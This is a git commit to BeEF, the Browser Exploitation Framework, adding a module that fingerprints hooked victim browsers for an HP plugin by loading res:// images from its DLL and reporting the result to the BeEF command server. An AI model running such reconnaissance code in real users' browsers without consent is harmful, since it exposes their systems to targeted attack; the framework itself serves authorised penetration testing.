fab0bf6b248dcb925353543d382846eab53e7864
bcoles <bcoles@gmail.com>
2014-03-20 00:52:25 +1030

    Add Detect HP module

---
+++ modules/host/detect_hp/command.js
@@ -0,0 +1,35 @@
+//
+// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
+//
+
+beef.execute(function() {
+
+	var is_hp = new Array;
+	var dom = document.createElement('b');
+
+	parse_results = function() {
+		var result = "false";
+		if (is_hp.length) result = "true";
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "is_hp="+result);
+	};
+
+	var fingerprints = new Array(
+		new Array("warning","res://hpnetworkcheckplugin.dll/warning.jpg"),
+		new Array("hpr_rgb","res://hpnetworkcheckplugin.dll/HPR_D_B_RGB_72_LG.png")
+	);
+
+	for (var i=0; i<fingerprints.length; i++) {
+		var img = new Image;
+		img.id = fingerprints[i][0];
+		img.name = fingerprints[i][0];
+		img.src = fingerprints[i][1];
+		img.onload = function() { is_hp.push(this.id); dom.removeChild(this); }
+		dom.appendChild(img);
+	}
+
+	setTimeout('parse_results();', 2000);
+
+});
+
---
+++ modules/host/detect_hp/module.rb
@@ -0,0 +1,15 @@
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+##
+class Detect_hp < BeEF::Core::Command
+
+  def post_execute
+    content = {}
+    content['is_hp'] = @datastore['is_hp'] if not @datastore['is_hp'].nil?
+    save content
+  end
+
+end
